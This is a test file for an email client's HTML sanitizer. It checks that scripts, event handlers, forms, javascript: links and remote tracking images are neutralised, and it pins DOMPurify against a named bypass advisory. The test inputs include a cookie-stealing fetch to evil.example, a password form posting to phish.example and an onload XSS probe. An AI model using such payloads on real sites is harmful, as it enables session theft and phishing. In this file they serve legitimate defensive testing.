/**
 * @vitest-environment jsdom
 *
 * These tests guard the two properties the whole product rests on: a message
 * cannot execute script, and a message cannot cause a network request.
 */
import { beforeAll, describe, expect, it } from "vitest";
import { sanitizeMessageHtml } from "../sanitize";
import type { Attachment } from "../model";

const noAttachments: Attachment[] = [];

beforeAll(() => {
  // jsdom has no blob URL store. The sanitizer only needs the URL to be an
  // opaque local string, so a counter stands in for the real thing.
  let n = 0;
  URL.createObjectURL = () => `blob:mock/${n++}`;
  URL.revokeObjectURL = () => {};
});

/** True if the element still carries a *live* src the browser would fetch. */
const hasLiveSrc = (html: string, url: string) =>
  new RegExp(`(?<!data-blocked-)src="${url.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}`).test(html);

describe("sanitizeMessageHtml", () => {
  it("strips script tags and inline event handlers", () => {
    const { html } = sanitizeMessageHtml(
      `<p onclick="steal()">hi</p><script>fetch('https://evil.example/'+document.cookie)</script>`,
      noAttachments,
    );
    expect(html).not.toContain("script");
    expect(html).not.toContain("onclick");
    expect(html).toContain("hi");
  });

  it("removes the src of a remote image so it can never load", () => {
    const { html, blockedRemote } = sanitizeMessageHtml(
      `<img src="https://tracker.example/pixel.gif?id=abc" width="1" height="1">`,
      noAttachments,
    );

    // The URL survives only as an inert data-blocked-src attribute, which the
    // UI uses to tell the user what it refused to load. What must NOT survive is
    // a live src the browser would act on.
    expect(hasLiveSrc(html, "https://tracker.example/pixel.gif")).toBe(false);
    expect(html).toContain("data-blocked-src");
    expect(blockedRemote).toHaveLength(1);
    expect(blockedRemote[0].url).toContain("tracker.example");
  });

  it("recognises a 1x1 remote image as a tracking pixel", () => {
    const { blockedRemote } = sanitizeMessageHtml(
      `<img src="https://mail.example/o/abcdef.gif" width="1" height="1">`,
      noAttachments,
    );
    expect(blockedRemote[0].likelyTracker).toBe(true);
  });

  it("does not flag an ordinary remote image as a tracker, but still blocks it", () => {
    const { blockedRemote } = sanitizeMessageHtml(
      `<img src="https://cdn.example/photo-of-a-dog.jpg" width="600" height="400">`,
      noAttachments,
    );
    expect(blockedRemote).toHaveLength(1);
    expect(blockedRemote[0].likelyTracker).toBe(false);
  });

  it("inlines cid: images as data: URLs, which survive the opaque-origin sandbox", () => {
    const att: Attachment = {
      id: "a1",
      filename: "logo.png",
      mimeType: "image/png",
      size: 4,
      contentId: "logo@example",
      inline: true,
      content: new Uint8Array([1, 2, 3, 4]),
    };

    const { html, blockedRemote } = sanitizeMessageHtml(`<img src="cid:logo@example">`, [att]);

    // It must be data:, not blob:. The body renders in a sandbox="" iframe with
    // an opaque origin, and a blob: URL minted by the parent is unreadable from
    // there -- the image would break. This assertion is the regression guard.
    expect(html).toContain("data:image/png;base64,AQIDBA==");
    expect(html).not.toContain("blob:");
    expect(blockedRemote).toHaveLength(0);
  });

  it("matches a cid: reference regardless of angle brackets or case", () => {
    // Content-ID headers are written <logo@example>; the body says cid:logo@example.
    const att: Attachment = {
      id: "a1",
      filename: "logo.png",
      mimeType: "image/png",
      size: 1,
      contentId: "<LOGO@Example>",
      inline: true,
      content: new Uint8Array([9]),
    };
    const { html } = sanitizeMessageHtml(`<img src="cid:logo@example">`, [att]);
    expect(html).toContain("data:image/png;base64,");
  });

  it("drops a cid: reference with no matching attachment instead of leaving it live", () => {
    const { html } = sanitizeMessageHtml(`<img src="cid:missing@example">`, noAttachments);
    expect(html).not.toContain("cid:");
  });

  it("neutralises forms, which are the other way a page can exfiltrate", () => {
    const { html } = sanitizeMessageHtml(
      `<form action="https://phish.example/steal"><input name="password"></form>`,
      noAttachments,
    );
    expect(html).not.toContain("form");
    expect(html).not.toContain("input");
  });

  it("makes surviving links safe: no referrer, no window.opener", () => {
    const { html } = sanitizeMessageHtml(`<a href="https://example.com/x">click</a>`, noAttachments);
    expect(html).toContain('rel="noopener noreferrer nofollow"');
    expect(html).toContain('target="_blank"');
  });

  it("strips javascript: URLs from links", () => {
    const { html } = sanitizeMessageHtml(
      `<a href="javascript:alert(1)">click</a>`,
      noAttachments,
    );
    expect(html).not.toContain("javascript:");
  });
});

/**
 * The sanitizer library itself, pinned at a version without a known bypass.
 *
 * GHSA-55q2-fjhq-7xh7 (DOMPurify <= 3.4.12): with `IN_PLACE`, a hook that
 * removes an element left that element's detached descendants untouched --
 * event handlers and all -- and a detached <img> still loads and fires them.
 *
 * sanitizeMessageHtml does not sanitize in place and its hook removes
 * attributes, never elements, so it was not the vulnerable configuration. The
 * test is here so that the dependency cannot slide back to an affected
 * version, whatever this module does with it in future.
 */
describe("DOMPurify: GHSA-55q2-fjhq-7xh7", () => {
  it("neutralises the detached subtree when a hook removes an element in place", async () => {
    const { default: DOMPurify } = await import("dompurify");

    const root = document.createElement("div");
    root.innerHTML =
      `<footer><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" ` +
      `onload="window.__xss = true"></footer><div>safe</div>`;
    // Hold on to the image: after sanitizing it is no longer reachable from root.
    const img = root.querySelector("img")!;

    DOMPurify.addHook("uponSanitizeElement", (node) => {
      if ((node as Element).tagName === "FOOTER") (node as Element).remove();
    });
    try {
      DOMPurify.sanitize(root, { ALLOWED_TAGS: ["div", "#text", "footer"], IN_PLACE: true });
    } finally {
      DOMPurify.removeAllHooks();
    }

    expect(root.innerHTML).toBe("<div>safe</div>");
    // The removed subtree must not keep anything that can run or load.
    expect(img.getAttribute("onload")).toBeNull();
  });
});
